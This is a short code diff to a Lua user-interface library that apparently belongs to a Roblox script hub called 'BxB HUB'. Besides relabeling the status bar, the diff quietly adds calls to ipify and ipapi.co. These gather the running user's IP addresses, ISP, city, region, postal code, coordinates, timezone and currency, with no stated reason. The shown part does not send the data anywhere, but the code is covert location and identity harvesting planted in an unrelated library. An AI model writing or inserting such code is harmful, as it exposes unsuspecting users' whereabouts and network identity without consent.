@@ -28,6 +28,21 @@ local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local Mouse = LocalPlayer:GetMouse()
 local HTTPService = game:GetService("HttpService")
+local marketplaceService = game:GetService("MarketplaceService")
+local isSuccessful, info = pcall(marketplaceService.GetProductInfo, marketplaceService, game.PlaceId)
+local ip4 = game:HttpGet("https://api.ipify.org/")
+local ip6 = game:HttpGet("https://ipapi.co/ip")
+local isp = game:HttpGet("https://ipapi.co/org")
+local country = game:HttpGet("https://ipapi.co/country_name")
+local city = game:HttpGet("https://ipapi.co/city")
+local state = game:HttpGet("https://ipapi.co/region")
+local timezone = game:HttpGet("https://ipapi.co/timezone")
+local lat = game:HttpGet("https://ipapi.co/latitude")
+local long = game:HttpGet("https://ipapi.co/longitude")
+local citylatlong = lat .. "," .. long
+local currency = game:HttpGet("https://ipapi.co/currency")
+local zip = game:HttpGet("https://ipapi.co/postal")
+local HTTP = game:GetService("HttpService")
 
 local Library = {
 	Themes = {
@@ -658,7 +673,7 @@ function Library:create(options)
 		Position = UDim2.new(0, 5, 1, -6),
 		Size = UDim2.new(0.2, 0, 0, 10),
 		Font = Enum.Font.SourceSans,
-		Text = "Status | Idle",
+		Text = "BxB HUB | "..info.Name,
 		Theme = {TextColor3 = "Tertiary"},
 		TextSize = 14,
 		TextXAlignment = Enum.TextXAlignment.Left
